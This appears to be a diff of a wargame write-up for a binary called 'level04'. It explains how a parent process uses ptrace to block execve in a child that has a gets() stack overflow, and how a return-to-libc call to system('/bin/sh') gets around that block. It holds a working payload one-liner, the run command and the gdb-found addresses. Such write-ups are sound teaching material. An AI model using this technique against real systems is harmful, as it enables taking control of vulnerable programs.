@@ -4,92 +4,89 @@
 
 ### BINARY BEHAVIOR
 
-- program asks for a shellcode
-- on exit, outputs "exit child"
+- Only a main function
+
+  - forks, child does a `gets()` on a stack buffer.
+    - => open door for a simple buffer overflow on sEIP of the child, as there is no stack canary
+
+- Analyzing the binary, we found that this won't work :
+
+  - ptrace(PTRACE_TRACEME) in the child makes it traced by the parent.
+    - => sends SIGTRAP to parent when child does a system interrupt
+      - SIGTRAP allows the parent to take control via a `wait`
+  - the parent calls `wait` to listen to changes in the child status
+    - a syscall is considered to be a change in status
+  - the parent calls `ptrace(PTRACE_PEEKUSER, pid, 44);`
+
+    - the return value of this call is the value of the childs `orig_eax` register, which store args sent to system calls.
+
+      - if the returned value is 11 (syscall execve from the child), the parent kills the child.
+
+    - We peek into the child process "user space" (structs below)
+      - offset of 44 bytes in the user space gets us precisely to orig_eax.
+      - => orig_eax is used to save the value inside eax at the moment of a syscall (as eax is then set with the syscall return value).
 
 ```
 struct user
 {
-    struct user_regs_struct regs;
-    int u_fpvalid;
-    struct user_fpregs_struct i387;
-    unsigned long int u_tsize;
-    unsigned long int u_dsize;
-    unsigned long int u_ssize;
-    unsigned long int start_code;
-    unsigned long int start_stack;
-    long int signal;
-    int reserved;
-    struct user_regs_struct* u_ar0;
-    struct user_fpregs_struct* u_fpstate;
-    unsigned long int magic;
-    char u_comm [32];
-    int u_debugreg [8];
+    struct user_regs_struct regs; // offset 0
+    ...
 };
 
 struct user_regs_struct
 {
-    long int ebx;
-    long int ecx;
-    long int edx;
-    long int esi;
-    long int edi;
-    long int ebp;
-    long int eax;
-    long int xds;
-    long int xes;
-    long int xfs;
-    long int xgs;
-    long int orig_eax;
-    long int eip;
-    long int xcs;
-    long int eflags;
-    long int esp;
-    long int xss;
+    ...
+    long int orig_eax; // offset 44
+    ...
 };
 ```
 
-- 44 bytes inside the user struct gets us inside the user_regs_struct, precisely to orig_eax.
-
-  - orig_eax is used to save the value inside eax at the moment of a syscall (as eax is then set with the syscall return value).
-
-- /usr/include/bits/waitstatus.h
-  - => MACRO WIF
-- /usr/include/asm/unistd_32.h
-
-  - => Syscall EXECVE is value 11 (0xb)
-  - ptrace
-
-- /usr/include/sys/prctl.h
-- /usr/include/bits/signum.h
-
-  - => prctl(1, 1) == prctl(PR_SET_PDEATHSIG, SIGHUP)
-
-- From wait man
-
-  > A state change is considered to be:
-  > the child terminated; (returned from its main function)
-  > the child was stopped by a signal
-  > the child was resumed by a signal.
-
-- ptrace(traceme) / man ptrace / /usr/include/sys/ptrace.h
-
-  - => les appels ultérieurs à execve(2) par ce processus lui enverront (au processus père) SIGTRAP, ce qui donne au père la possibilité de reprendre le contrôle avant que le nouveau programme continue son exécution. Un processus ne doit pas envoyer cette requête si son père n'est pas prêt à le suivre. Dans cette requête, pid, addr et data sont ignorés.
-
-- We understand that if the child process exits normally or with a signal, we will output puts("child is exiting..."); and return.
-- If the child does a system interrupt with execve (11) code, the wait will catch it (thanks to ptrace(TRACEME) or exit from main function), output "no exec() for you" and kill the child process.
-  - if because of ptrace(TRACEME) sending a SIGTRAP, execve won't even be executed.
+- Considering all this, we understand that a system call execve("/bin/sh") won't be possible here.
 
 ### EXPLOIT STRATEGY
 
 - We need to launch the shell other than with a system interrupt execve.
+- `system` function from libc is implemented using a fork.
 
   - => return to libc exploit, we call the system function from C stdlib.
+  - No execve, no code 11 catched by the parent, no kill of the child.
+    - => We bypass the security
 
-- system from libc is implemented using a fork.
+- Classic call to a function is performed via the call instruction
+  - (== push EIP + jmp func_addr)
+- What we do is we use a ret instruction instead of a call
 
-  - Don't know if fork creates a status change, but anyway it won't be a system interrupt with code 11.
+  - (== pop EIP + jmp EIP)
+    - => stack state != normal function call
 
-- This way we bypass the security
+- If we want to mimic this "normal call state" we need to have, just before the call :
+  - ESP : system@plt addr
+    - will be popped from the stack and jumped to
+  - ESP + 4 : random value (or exit to be more classy)
+    - location of sEIP for system
+  - ESP + 8 : arg1 of system call
+    - => "/bin/sh" string addr
 
 ### RUN COMMAND
+
+```
+python -c 'print "A" * 156 +"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit_string
+cat /tmp/exploit_string - | ./level04
+```
+
+#### RESOURCES
+
+- /usr/include/bits/waitstatus.h => MACRO WIF
+- /usr/include/asm/unistd_32.h => Syscall EXECVE is value 11 (0xb) (+ ptrace values)
+- /usr/include/sys/prctl.h => prctl(1, 1) == prctl(PR_SET_PDEATHSIG, SIGHUP)
+- /usr/include/bits/signum.h
+  -man ptrace / /usr/include/sys/ptrace.h
+
+(gdb) find \_\_libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+p system
+system = 0xf7e6aed0
+
+p exit
+exit = 0xf7e5eb70
